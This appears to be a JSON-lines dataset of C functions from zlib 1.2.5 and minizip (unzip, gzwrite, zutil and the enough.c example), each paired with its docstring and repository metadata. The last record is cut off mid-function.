{"docstring": "/*\n   Translate date/time from Dos format to tm_unz (readable more easilty)\n*/\n", "func_signal": "local void unz64local_DosDateToTmuDate (ZPOS64_T ulDosDate, tm_unz* ptm)", "code": "{\n    ZPOS64_T uDate;\n    uDate = (ZPOS64_T)(ulDosDate>>16);\n    ptm->tm_mday = (uInt)(uDate&0x1f) ;\n    ptm->tm_mon =  (uInt)((((uDate)&0x1E0)/0x20)-1) ;\n    ptm->tm_year = (uInt)(((uDate&0x0FE00)/0x0200)+1980) ;\n\n    ptm->tm_hour = (uInt) ((ulDosDate &0xF800)/0x800);\n    ptm->tm_min =  (uInt) ((ulDosDate&0x7E0)/0x20) ;\n    ptm->tm_sec =  (uInt) (2*(ulDosDate&0x1f)) ;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* My own strcmpi / strcasecmp */\n", "func_signal": "local int strcmpcasenosensitive_internal (const char* fileName1, const char* fileName2)", "code": "{\n    for (;;)\n    {\n        char c1=*(fileName1++);\n        char c2=*(fileName2++);\n        if ((c1>='a') && (c1<='z'))\n            c1 -= 0x20;\n        if ((c2>='a') && (c2<='z'))\n            c2 -= 0x20;\n        if (c1=='\\0')\n            return ((c2=='\\0') ? 0 : -1);\n        if (c2=='\\0')\n            return 1;\n        if (c1<c2)\n            return -1;\n        if (c1>c2)\n            return 1;\n    }\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* -- see zlib.h -- */\n", "func_signal": "int ZEXPORTVA gzprintf (gzFile file, const char *format, ...)", "code": "{\n    int size, len;\n    gz_statep state;\n    z_streamp strm;\n    va_list va;\n\n    /* get internal structure */\n    if (file == NULL)\n        return -1;\n    state = (gz_statep)file;\n    strm = &(state->strm);\n\n    /* check that we're writing and that there's no error */\n    if (state->mode != GZ_WRITE || state->err != Z_OK)\n        return 0;\n\n    /* make sure we have some buffer space */\n    if (state->size == 0 && gz_init(state) == -1)\n        return 0;\n\n    /* check for seek request */\n    if (state->seek) {\n        state->seek = 0;\n        if (gz_zero(state, state->skip) == -1)\n            return 0;\n    }\n\n    /* consume whatever's left in the input buffer */\n    if (strm->avail_in && gz_comp(state, Z_NO_FLUSH) == -1)\n        return 0;\n\n    /* do the printf() into the input buffer, put length in len */\n    size = (int)(state->size);\n    state->in[size - 1] = 0;\n    va_start(va, format);\n#ifdef NO_vsnprintf\n#  ifdef HAS_vsprintf_void\n    (void)vsprintf(state->in, format, va);\n    va_end(va);\n    for (len = 0; len < size; len++)\n        if (state->in[len] == 0) break;\n#  else\n    len = vsprintf(state->in, format, va);\n    va_end(va);\n#  endif\n#else\n#  ifdef HAS_vsnprintf_void\n    (void)vsnprintf(state->in, size, format, va);\n    va_end(va);\n    len = strlen(state->in);\n#  else\n    len = vsnprintf((char *)(state->in), size, format, va);\n    va_end(va);\n#  endif\n#endif\n\n    /* check that printf() results fit in buffer */\n    if (len <= 0 || len >= (int)size || state->in[size - 1] != 0)\n        return 0;\n\n    /* update buffer and position, defer compression until needed */\n    strm->avail_in = (unsigned)len;\n    strm->next_in = state->in;\n    state->pos += len;\n    return len;\n}", "path": "common\\zlib-1.2.5\\gzwrite.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* Return the number of possible Huffman codes using bit patterns of lengths\n   len through max inclusive, coding syms symbols, with left bit patterns of\n   length len unused -- return -1 if there is an overflow in the counting.\n   Keep a record of previous results in num to prevent repeating the same\n   calculation.  Uses the globals max and num. */\n", "func_signal": "local big_t count(int syms, int len, int left)", "code": "{\n    big_t sum;          /* number of possible codes from this juncture */\n    big_t got;          /* value returned from count() */\n    int least;          /* least number of syms to use at this juncture */\n    int most;           /* most number of syms to use at this juncture */\n    int use;            /* number of bit patterns to use in next call */\n    size_t index;       /* index of this case in *num */\n\n    /* see if only one possible code */\n    if (syms == left)\n        return 1;\n\n    /* note and verify the expected state */\n    assert(syms > left && left > 0 && len < max);\n\n    /* see if we've done this one already */\n    index = INDEX(syms, left, len);\n    got = num[index];\n    if (got)\n        return got;         /* we have -- return the saved result */\n\n    /* we need to use at least this many bit patterns so that the code won't be\n       incomplete at the next length (more bit patterns than symbols) */\n    least = (left << 1) - syms;\n    if (least < 0)\n        least = 0;\n\n    /* we can use at most this many bit patterns, lest there not be enough\n       available for the remaining symbols at the maximum length (if there were\n       no limit to the code length, this would become: most = left - 1) */\n    most = (((code_t)left << (max - len)) - syms) /\n            (((code_t)1 << (max - len)) - 1);\n\n    /* count all possible codes from this juncture and add them up */\n    sum = 0;\n    for (use = least; use <= most; use++) {\n        got = count(syms - use, len + 1, (left - use) << 1);\n        sum += got;\n        if (got == -1 || sum < got)         /* overflow */\n            return -1;\n    }\n\n    /* verify that all recursive calls are productive */\n    assert(sum != 0);\n\n    /* save the result and return it */\n    num[index] = sum;\n    return sum;\n}", "path": "common\\zlib-1.2.5\\examples\\enough.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* This table is used to remember the original form of pointers\n * to large buffers (64K). Such pointers are normalized with a zero offset.\n * Since MSDOS is not a preemptive multitasking OS, this table is not\n * protected from concurrent access. This hack doesn't work anyway on\n * a protected system like OS/2. Use Microsoft C instead.\n */\n", "func_signal": "voidpf ZLIB_INTERNAL zcalloc (voidpf opaque, unsigned items, unsigned size)", "code": "{\n    voidpf buf = opaque; /* just to make some compilers happy */\n    ulg bsize = (ulg)items*size;\n\n    /* If we allocate less than 65520 bytes, we assume that farmalloc\n     * will return a usable pointer which doesn't have to be normalized.\n     */\n    if (bsize < 65520L) {\n        buf = farmalloc(bsize);\n        if (*(ush*)&buf != 0) return buf;\n    } else {\n        buf = farmalloc(bsize + 16L);\n    }\n    if (buf == NULL || next_ptr >= MAX_PTR) return NULL;\n    table[next_ptr].org_ptr = buf;\n\n    /* Normalize the pointer to seg:0 */\n    *((ush*)&buf+1) += ((ush)((uch*)buf-0) + 15) >> 4;\n    *(ush*)&buf = 0;\n    table[next_ptr++].new_ptr = buf;\n    return buf;\n}", "path": "common\\zlib-1.2.5\\zutil.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Read bytes from the current file.\n  buf contain buffer where data must be copied\n  len the size of buf.\n\n  return the number of byte copied if somes bytes are copied\n  return 0 if the end of file was reached\n  return <0 with error code if there is an error\n    (UNZ_ERRNO for IO error, or zLib error for uncompress error)\n*/\n", "func_signal": "extern int ZEXPORT unzReadCurrentFile  (unzFile file, voidp buf, unsigned len)", "code": "{\n    int err=UNZ_OK;\n    uInt iRead = 0;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    pfile_in_zip_read_info=s->pfile_in_zip_read;\n\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_PARAMERROR;\n\n\n    if ((pfile_in_zip_read_info->read_buffer == NULL))\n        return UNZ_END_OF_LIST_OF_FILE;\n    if (len==0)\n        return 0;\n\n    pfile_in_zip_read_info->stream.next_out = (Bytef*)buf;\n\n    pfile_in_zip_read_info->stream.avail_out = (uInt)len;\n\n    if ((len>pfile_in_zip_read_info->rest_read_uncompressed) &&\n        (!(pfile_in_zip_read_info->raw)))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_uncompressed;\n\n    if ((len>pfile_in_zip_read_info->rest_read_compressed+\n           pfile_in_zip_read_info->stream.avail_in) &&\n         (pfile_in_zip_read_info->raw))\n        pfile_in_zip_read_info->stream.avail_out =\n            (uInt)pfile_in_zip_read_info->rest_read_compressed+\n            pfile_in_zip_read_info->stream.avail_in;\n\n    while (pfile_in_zip_read_info->stream.avail_out>0)\n    {\n        if ((pfile_in_zip_read_info->stream.avail_in==0) &&\n            (pfile_in_zip_read_info->rest_read_compressed>0))\n        {\n            uInt uReadThis = UNZ_BUFSIZE;\n            if (pfile_in_zip_read_info->rest_read_compressed<uReadThis)\n                uReadThis = (uInt)pfile_in_zip_read_info->rest_read_compressed;\n            if (uReadThis == 0)\n                return UNZ_EOF;\n            if (ZSEEK64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->pos_in_zipfile +\n                         pfile_in_zip_read_info->byte_before_the_zipfile,\n                         ZLIB_FILEFUNC_SEEK_SET)!=0)\n                return UNZ_ERRNO;\n            if (ZREAD64(pfile_in_zip_read_info->z_filefunc,\n                      pfile_in_zip_read_info->filestream,\n                      pfile_in_zip_read_info->read_buffer,\n                      uReadThis)!=uReadThis)\n                return UNZ_ERRNO;\n\n\n#            ifndef NOUNCRYPT\n            if(s->encrypted)\n            {\n                uInt i;\n                for(i=0;i<uReadThis;i++)\n                  pfile_in_zip_read_info->read_buffer[i] =\n                      zdecode(s->keys,s->pcrc_32_tab,\n                              pfile_in_zip_read_info->read_buffer[i]);\n            }\n#            endif\n\n\n            pfile_in_zip_read_info->pos_in_zipfile += uReadThis;\n\n            pfile_in_zip_read_info->rest_read_compressed-=uReadThis;\n\n            pfile_in_zip_read_info->stream.next_in =\n                (Bytef*)pfile_in_zip_read_info->read_buffer;\n            pfile_in_zip_read_info->stream.avail_in = (uInt)uReadThis;\n        }\n\n        if ((pfile_in_zip_read_info->compression_method==0) || (pfile_in_zip_read_info->raw))\n        {\n            uInt uDoCopy,i ;\n\n            if ((pfile_in_zip_read_info->stream.avail_in == 0) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                return (iRead==0) ? UNZ_EOF : iRead;\n\n            if (pfile_in_zip_read_info->stream.avail_out <\n                            pfile_in_zip_read_info->stream.avail_in)\n                uDoCopy = pfile_in_zip_read_info->stream.avail_out ;\n            else\n                uDoCopy = pfile_in_zip_read_info->stream.avail_in ;\n\n            for (i=0;i<uDoCopy;i++)\n                *(pfile_in_zip_read_info->stream.next_out+i) =\n                        *(pfile_in_zip_read_info->stream.next_in+i);\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uDoCopy;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,\n                                pfile_in_zip_read_info->stream.next_out,\n                                uDoCopy);\n            pfile_in_zip_read_info->rest_read_uncompressed-=uDoCopy;\n            pfile_in_zip_read_info->stream.avail_in -= uDoCopy;\n            pfile_in_zip_read_info->stream.avail_out -= uDoCopy;\n            pfile_in_zip_read_info->stream.next_out += uDoCopy;\n            pfile_in_zip_read_info->stream.next_in += uDoCopy;\n            pfile_in_zip_read_info->stream.total_out += uDoCopy;\n            iRead += uDoCopy;\n        }\n        else if (pfile_in_zip_read_info->compression_method==Z_BZIP2ED)\n        {\n#ifdef HAVE_BZIP2\n            uLong uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            uLong uOutThis;\n\n            pfile_in_zip_read_info->bstream.next_in        = (char*)pfile_in_zip_read_info->stream.next_in;\n            pfile_in_zip_read_info->bstream.avail_in       = pfile_in_zip_read_info->stream.avail_in;\n            pfile_in_zip_read_info->bstream.total_in_lo32  = pfile_in_zip_read_info->stream.total_in;\n            pfile_in_zip_read_info->bstream.total_in_hi32  = 0;\n            pfile_in_zip_read_info->bstream.next_out       = (char*)pfile_in_zip_read_info->stream.next_out;\n            pfile_in_zip_read_info->bstream.avail_out      = pfile_in_zip_read_info->stream.avail_out;\n            pfile_in_zip_read_info->bstream.total_out_lo32 = pfile_in_zip_read_info->stream.total_out;\n            pfile_in_zip_read_info->bstream.total_out_hi32 = 0;\n\n            uTotalOutBefore = pfile_in_zip_read_info->bstream.total_out_lo32;\n            bufBefore = (const Bytef *)pfile_in_zip_read_info->bstream.next_out;\n\n            err=BZ2_bzDecompress(&pfile_in_zip_read_info->bstream);\n\n            uTotalOutAfter = pfile_in_zip_read_info->bstream.total_out_lo32;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 = crc32(pfile_in_zip_read_info->crc32,bufBefore, (uInt)(uOutThis));\n            pfile_in_zip_read_info->rest_read_uncompressed -= uOutThis;\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            pfile_in_zip_read_info->stream.next_in   = (Bytef*)pfile_in_zip_read_info->bstream.next_in;\n            pfile_in_zip_read_info->stream.avail_in  = pfile_in_zip_read_info->bstream.avail_in;\n            pfile_in_zip_read_info->stream.total_in  = pfile_in_zip_read_info->bstream.total_in_lo32;\n            pfile_in_zip_read_info->stream.next_out  = (Bytef*)pfile_in_zip_read_info->bstream.next_out;\n            pfile_in_zip_read_info->stream.avail_out = pfile_in_zip_read_info->bstream.avail_out;\n            pfile_in_zip_read_info->stream.total_out = pfile_in_zip_read_info->bstream.total_out_lo32;\n\n            if (err==BZ_STREAM_END)\n              return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=BZ_OK)\n              break;\n#endif\n        } // end Z_BZIP2ED\n        else\n        {\n            ZPOS64_T uTotalOutBefore,uTotalOutAfter;\n            const Bytef *bufBefore;\n            ZPOS64_T uOutThis;\n            int flush=Z_SYNC_FLUSH;\n\n            uTotalOutBefore = pfile_in_zip_read_info->stream.total_out;\n            bufBefore = pfile_in_zip_read_info->stream.next_out;\n\n            /*\n            if ((pfile_in_zip_read_info->rest_read_uncompressed ==\n                     pfile_in_zip_read_info->stream.avail_out) &&\n                (pfile_in_zip_read_info->rest_read_compressed == 0))\n                flush = Z_FINISH;\n            */\n            err=inflate(&pfile_in_zip_read_info->stream,flush);\n\n            if ((err>=0) && (pfile_in_zip_read_info->stream.msg!=NULL))\n              err = Z_DATA_ERROR;\n\n            uTotalOutAfter = pfile_in_zip_read_info->stream.total_out;\n            uOutThis = uTotalOutAfter-uTotalOutBefore;\n\n            pfile_in_zip_read_info->total_out_64 = pfile_in_zip_read_info->total_out_64 + uOutThis;\n\n            pfile_in_zip_read_info->crc32 =\n                crc32(pfile_in_zip_read_info->crc32,bufBefore,\n                        (uInt)(uOutThis));\n\n            pfile_in_zip_read_info->rest_read_uncompressed -=\n                uOutThis;\n\n            iRead += (uInt)(uTotalOutAfter - uTotalOutBefore);\n\n            if (err==Z_STREAM_END)\n                return (iRead==0) ? UNZ_EOF : iRead;\n            if (err!=Z_OK)\n                break;\n        }\n    }\n\n    if (err==Z_OK)\n        return iRead;\n    return err;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Open for reading data the current file in the zipfile.\n  If there is no error and the file is opened, the return value is UNZ_OK.\n*/\n", "func_signal": "extern int ZEXPORT unzOpenCurrentFile3 (unzFile file, int* method,\n                                            int* level, int raw, const char* password)", "code": "{\n    int err=UNZ_OK;\n    uInt iSizeVar;\n    unz64_s* s;\n    file_in_zip64_read_info_s* pfile_in_zip_read_info;\n    ZPOS64_T offset_local_extrafield;  /* offset of the local extra field */\n    uInt  size_local_extrafield;    /* size of the local extra field */\n#    ifndef NOUNCRYPT\n    char source[12];\n#    else\n    if (password != NULL)\n        return UNZ_PARAMERROR;\n#    endif\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_PARAMERROR;\n\n    if (s->pfile_in_zip_read != NULL)\n        unzCloseCurrentFile(file);\n\n    if (unz64local_CheckCurrentFileCoherencyHeader(s,&iSizeVar, &offset_local_extrafield,&size_local_extrafield)!=UNZ_OK)\n        return UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info = (file_in_zip64_read_info_s*)ALLOC(sizeof(file_in_zip64_read_info_s));\n    if (pfile_in_zip_read_info==NULL)\n        return UNZ_INTERNALERROR;\n\n    pfile_in_zip_read_info->read_buffer=(char*)ALLOC(UNZ_BUFSIZE);\n    pfile_in_zip_read_info->offset_local_extrafield = offset_local_extrafield;\n    pfile_in_zip_read_info->size_local_extrafield = size_local_extrafield;\n    pfile_in_zip_read_info->pos_local_extrafield=0;\n    pfile_in_zip_read_info->raw=raw;\n\n    if (pfile_in_zip_read_info->read_buffer==NULL)\n    {\n        TRYFREE(pfile_in_zip_read_info);\n        return UNZ_INTERNALERROR;\n    }\n\n    pfile_in_zip_read_info->stream_initialised=0;\n\n    if (method!=NULL)\n        *method = (int)s->cur_file_info.compression_method;\n\n    if (level!=NULL)\n    {\n        *level = 6;\n        switch (s->cur_file_info.flag & 0x06)\n        {\n          case 6 : *level = 1; break;\n          case 4 : *level = 2; break;\n          case 2 : *level = 9; break;\n        }\n    }\n\n    if ((s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n        (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n        (s->cur_file_info.compression_method!=Z_DEFLATED))\n\n        err=UNZ_BADZIPFILE;\n\n    pfile_in_zip_read_info->crc32_wait=s->cur_file_info.crc;\n    pfile_in_zip_read_info->crc32=0;\n    pfile_in_zip_read_info->total_out_64=0;\n    pfile_in_zip_read_info->compression_method = s->cur_file_info.compression_method;\n    pfile_in_zip_read_info->filestream=s->filestream;\n    pfile_in_zip_read_info->z_filefunc=s->z_filefunc;\n    pfile_in_zip_read_info->byte_before_the_zipfile=s->byte_before_the_zipfile;\n\n    pfile_in_zip_read_info->stream.total_out = 0;\n\n    if ((s->cur_file_info.compression_method==Z_BZIP2ED) && (!raw))\n    {\n#ifdef HAVE_BZIP2\n      pfile_in_zip_read_info->bstream.bzalloc = (void *(*) (void *, int, int))0;\n      pfile_in_zip_read_info->bstream.bzfree = (free_func)0;\n      pfile_in_zip_read_info->bstream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->bstream.state = (voidpf)0;\n\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = (voidpf)0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=BZ2_bzDecompressInit(&pfile_in_zip_read_info->bstream, 0, 0);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_BZIP2ED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n#else\n      pfile_in_zip_read_info->raw=1;\n#endif\n    }\n    else if ((s->cur_file_info.compression_method==Z_DEFLATED) && (!raw))\n    {\n      pfile_in_zip_read_info->stream.zalloc = (alloc_func)0;\n      pfile_in_zip_read_info->stream.zfree = (free_func)0;\n      pfile_in_zip_read_info->stream.opaque = (voidpf)0;\n      pfile_in_zip_read_info->stream.next_in = 0;\n      pfile_in_zip_read_info->stream.avail_in = 0;\n\n      err=inflateInit2(&pfile_in_zip_read_info->stream, -MAX_WBITS);\n      if (err == Z_OK)\n        pfile_in_zip_read_info->stream_initialised=Z_DEFLATED;\n      else\n      {\n        TRYFREE(pfile_in_zip_read_info);\n        return err;\n      }\n        /* windowBits is passed < 0 to tell that there is no zlib header.\n         * Note that in this case inflate *requires* an extra \"dummy\" byte\n         * after the compressed stream in order to complete decompression and\n         * return Z_STREAM_END.\n         * In unzip, i don't wait absolutely Z_STREAM_END because I known the\n         * size of both compressed and uncompressed data\n         */\n    }\n    pfile_in_zip_read_info->rest_read_compressed =\n            s->cur_file_info.compressed_size ;\n    pfile_in_zip_read_info->rest_read_uncompressed =\n            s->cur_file_info.uncompressed_size ;\n\n\n    pfile_in_zip_read_info->pos_in_zipfile =\n            s->cur_file_info_internal.offset_curfile + SIZEZIPLOCALHEADER +\n              iSizeVar;\n\n    pfile_in_zip_read_info->stream.avail_in = (uInt)0;\n\n    s->pfile_in_zip_read = pfile_in_zip_read_info;\n                s->encrypted = 0;\n\n#    ifndef NOUNCRYPT\n    if (password != NULL)\n    {\n        int i;\n        s->pcrc_32_tab = get_crc_table();\n        init_keys(password,s->keys,s->pcrc_32_tab);\n        if (ZSEEK64(s->z_filefunc, s->filestream,\n                  s->pfile_in_zip_read->pos_in_zipfile +\n                     s->pfile_in_zip_read->byte_before_the_zipfile,\n                  SEEK_SET)!=0)\n            return UNZ_INTERNALERROR;\n        if(ZREAD64(s->z_filefunc, s->filestream,source, 12)<12)\n            return UNZ_INTERNALERROR;\n\n        for (i = 0; i<12; i++)\n            zdecode(s->keys,s->pcrc_32_tab,source[i]);\n\n        s->pfile_in_zip_read->pos_in_zipfile+=12;\n        s->encrypted=1;\n    }\n#    endif\n\n\n    return UNZ_OK;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n   Compare two filename (fileName1,fileName2).\n   If iCaseSenisivity = 1, comparision is case sensitivity (like strcmp)\n   If iCaseSenisivity = 2, comparision is not case sensitivity (like strcmpi\n                                                                or strcasecmp)\n   If iCaseSenisivity = 0, case sensitivity is defaut of your operating system\n        (like 1 on Unix, 2 on Windows)\n\n*/\n", "func_signal": "extern int ZEXPORT unzStringFileNameCompare (const char*  fileName1,\n                                                 const char*  fileName2,\n                                                 int iCaseSensitivity)", "code": "{\n    if (iCaseSensitivity==0)\n        iCaseSensitivity=CASESENSITIVITYDEFAULTVALUE;\n\n    if (iCaseSensitivity==1)\n        return strcmp(fileName1,fileName2);\n\n    return STRCMPCASENOSENTIVEFUNCTION(fileName1,fileName2);\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* Free allocated space.  Uses globals code, num, and done. */\n", "func_signal": "local void cleanup(void)", "code": "{\n    size_t n;\n\n    if (done != NULL) {\n        for (n = 0; n < size; n++)\n            if (done[n].len)\n                free(done[n].vec);\n        free(done);\n    }\n    if (num != NULL)\n        free(num);\n    if (code != NULL)\n        free(code);\n}", "path": "common\\zlib-1.2.5\\examples\\enough.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Try locate the file szFileName in the zipfile.\n  For the iCaseSensitivity signification, see unzipStringFileNameCompare\n\n  return value :\n  UNZ_OK if the file is found. It becomes the current file.\n  UNZ_END_OF_LIST_OF_FILE if the file is not found\n*/\n", "func_signal": "extern int ZEXPORT unzLocateFile (unzFile file, const char *szFileName, int iCaseSensitivity)", "code": "{\n    unz64_s* s;\n    int err;\n\n    /* We remember the 'current' position in the file so that we can jump\n     * back there if we fail.\n     */\n    unz_file_info64 cur_file_infoSaved;\n    unz_file_info64_internal cur_file_info_internalSaved;\n    ZPOS64_T num_fileSaved;\n    ZPOS64_T pos_in_central_dirSaved;\n\n\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n\n    if (strlen(szFileName)>=UNZ_MAXFILENAMEINZIP)\n        return UNZ_PARAMERROR;\n\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    /* Save the current state */\n    num_fileSaved = s->num_file;\n    pos_in_central_dirSaved = s->pos_in_central_dir;\n    cur_file_infoSaved = s->cur_file_info;\n    cur_file_info_internalSaved = s->cur_file_info_internal;\n\n    err = unzGoToFirstFile(file);\n\n    while (err == UNZ_OK)\n    {\n        char szCurrentFileName[UNZ_MAXFILENAMEINZIP+1];\n        err = unzGetCurrentFileInfo64(file,NULL,\n                                    szCurrentFileName,sizeof(szCurrentFileName)-1,\n                                    NULL,0,NULL,0);\n        if (err == UNZ_OK)\n        {\n            if (unzStringFileNameCompare(szCurrentFileName,\n                                            szFileName,iCaseSensitivity)==0)\n                return UNZ_OK;\n            err = unzGoToNextFile(file);\n        }\n    }\n\n    /* We failed, so restore the state of the 'current file' to where we\n     * were.\n     */\n    s->num_file = num_fileSaved ;\n    s->pos_in_central_dir = pos_in_central_dirSaved ;\n    s->cur_file_info = cur_file_infoSaved;\n    s->cur_file_info_internal = cur_file_info_internalSaved;\n    return err;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\ntypedef struct unz_file_pos_s\n{\n    ZPOS64_T pos_in_zip_directory;   // offset in file\n    ZPOS64_T num_of_file;            // # of file\n} unz_file_pos;\n*/\n", "func_signal": "extern int ZEXPORT unzGetFilePos64(unzFile file, unz64_file_pos*  file_pos)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL || file_pos==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n        return UNZ_END_OF_LIST_OF_FILE;\n\n    file_pos->pos_in_zip_directory  = s->pos_in_central_dir;\n    file_pos->num_of_file           = s->num_file;\n\n    return UNZ_OK;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/* Additions by RX '2004 */\n", "func_signal": "extern ZPOS64_T ZEXPORT unzGetOffset64(unzFile file)", "code": "{\n    unz64_s* s;\n\n    if (file==NULL)\n          return 0; //UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    if (!s->current_file_ok)\n      return 0;\n    if (s->gi.number_entry != 0 && s->gi.number_entry != 0xffff)\n      if (s->num_file==s->gi.number_entry)\n         return 0;\n    return s->pos_in_central_dir;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Write info about the ZipFile in the *pglobal_info structure.\n  No preparation of the structure is needed\n  return UNZ_OK if there is no problem. */\n", "func_signal": "extern int ZEXPORT unzGetGlobalInfo64 (unzFile file, unz_global_info64* pglobal_info)", "code": "{\n    unz64_s* s;\n    if (file==NULL)\n        return UNZ_PARAMERROR;\n    s=(unz64_s*)file;\n    *pglobal_info=s->gi;\n    return UNZ_OK;\n}", "path": "common\\zlib-1.2.5\\contrib\\minizip\\unzip.c", "repo_name": "Jackarain/Update", "stars": 49, "license": "bsl-1.0", "language": "c", "size": 1353}
{"docstring": "/*\n  Read the local header of the current zipfile\n  Check the coherency of the local header and info in the end of central\n        directory about this file\n  store in *piSizeVar the size of extra info in local header\n        (filename and size of extra field data)\n*/\n", "func_signal": "local int unz64local_CheckCurrentFileCoherencyHeader (unz64_s* s, uInt* piSizeVar,\n                                                    ZPOS64_T * poffset_local_extrafield,\n                                                    uInt  * psize_local_extrafield)", "code": "{\n    uLong uMagic,uData,uFlags;\n    uLong size_filename;\n    uLong size_extra_field;\n    int err=UNZ_OK;\n\n    *piSizeVar = 0;\n    *poffset_local_extrafield = 0;\n    *psize_local_extrafield = 0;\n\n    if (ZSEEK64(s->z_filefunc, s->filestream,s->cur_file_info_internal.offset_curfile +\n                                s->byte_before_the_zipfile,ZLIB_FILEFUNC_SEEK_SET)!=0)\n        return UNZ_ERRNO;\n\n\n    if (err==UNZ_OK)\n    {\n        if (unz64local_getLong(&s->z_filefunc, s->filestream,&uMagic) != UNZ_OK)\n            err=UNZ_ERRNO;\n        else if (uMagic!=0x04034b50)\n            err=UNZ_BADZIPFILE;\n    }\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n/*\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.wVersion))\n        err=UNZ_BADZIPFILE;\n*/\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uFlags) != UNZ_OK)\n        err=UNZ_ERRNO;\n\n    if (unz64local_getShort(&s->z_filefunc, s->filestream,&uData) != UNZ_OK)\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.compression_method))\n        err=UNZ_BADZIPFILE;\n\n    if ((err==UNZ_OK) && (s->cur_file_info.compression_method!=0) &&\n/* #ifdef HAVE_BZIP2 */\n                         (s->cur_file_info.compression_method!=Z_BZIP2ED) &&\n/* #endif */\n                         (s->cur_file_info.compression_method!=Z_DEFLATED))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* date/time */\n        err=UNZ_ERRNO;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* crc */\n        err=UNZ_ERRNO;\n    else if ((err==UNZ_OK) && (uData!=s->cur_file_info.crc) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size compr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.compressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getLong(&s->z_filefunc, s->filestream,&uData) != UNZ_OK) /* size uncompr */\n        err=UNZ_ERRNO;\n    else if (uData != 0xFFFFFFFF && (err==UNZ_OK) && (uData!=s->cur_file_info.uncompressed_size) && ((uFlags & 8)==0))\n        err=UNZ_BADZIPFILE;\n\n    if (unz64local_getShort(&s->z_filefunc, 